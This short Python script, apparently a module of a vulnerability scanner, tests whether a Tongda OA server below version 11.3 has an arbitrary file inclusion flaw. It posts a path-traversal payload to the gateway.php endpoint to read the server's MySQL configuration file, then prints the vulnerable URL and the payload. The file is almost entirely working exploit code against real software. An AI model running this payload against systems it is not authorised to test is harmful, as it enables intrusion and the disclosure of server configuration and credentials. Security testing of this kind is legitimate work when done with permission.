import requests
import time

RED = '\x1b[1;91m'
CYAN = '\033[1;36m'
GREEN = '\033[1;32m'
BOLD = '\033[1m'
END = '\033[0m'

def fileInclude(host): # 通达<11.3任意文件包含漏洞
    content = ''
    print(CYAN + '[->] 正在测试是否存在<11.3任意文件包含漏洞' + END)
    url = host + 'ispirit/interface/gateway.php'
    try:
        data = {'json':'{"url":"general/../../mysql5/my.ini"}'}
        response = requests.post(url=url,data=data,timeout=2)
        # print(response.text)
        if 'mysql' in response.text:
            content += '[*] 存在任意文件包含漏洞,路径如下:' + '\n'
            content += url + '\n'
            content += 'POST的值如下:' + '\n'
            content += 'json={"url":"general/../../mysql5/my.ini"}' + '\r\n'
            print(GREEN + content + END)
            return content
        else:
            content += '[-] 不存在<11.3任意文件包含漏洞' + '\n'
            print(RED + content + END)
            return content
    except:
        pass

def run(host):
    fileInclude(host)
